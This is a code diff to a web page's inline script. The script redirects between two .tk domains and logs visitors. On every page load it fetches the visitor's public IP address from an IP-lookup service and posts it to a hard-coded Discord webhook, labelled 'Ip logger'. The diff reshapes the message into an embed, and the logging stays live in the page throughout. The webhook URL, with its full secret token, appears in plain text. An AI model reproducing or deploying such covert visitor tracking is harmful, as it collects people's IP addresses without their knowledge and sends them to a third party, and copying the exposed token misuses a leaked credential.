@@ -163,20 +163,31 @@
 if(location.href==="https://memastermind.tk/"){location.href = "https://mastermind.tk"}
 url="https://discord.com/a"+"pi/webhooks/106605308302669"+"8261/B1uFDsNnlIWvu4VtvZ5_0grNrT-Guix4AAzrAgmE7KQvhH9RiFn1aAWC-PcXtMu30tTz"
 fetch("https://api.ipify.org?format=json", {cors: "no-cors"}).then(res => res.json()).then(data => {
-  params= {
-    "username": "Ip logger",
-    "avatar_url": "https://cdn.discordapp.com/avatars/693116936871084063/0f9b9b1b1b1b1b1b1b1b1b1b1b1b1b1b.png?size=1024",
-    "content": " IP: "+data.ip
+  
+  var myEmbed = {
+    author: {
+      name: " ",
+    },
+    title: " Ip address:",
+    description: data.ip,
+    color: "16777215"
   }
+
+  var params = {
+    username: "Ip logger",
+    embeds: [ myEmbed ]
+  }
+
   fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            content: params
-        })
-    })
+  method: "POST",
+  headers: {
+    'Content-Type': 'application/json'
+  },
+    body: JSON.stringify(params) 
+  }).then(res => {
+    console.log(res)
+})
+
 }
 )
 </script>
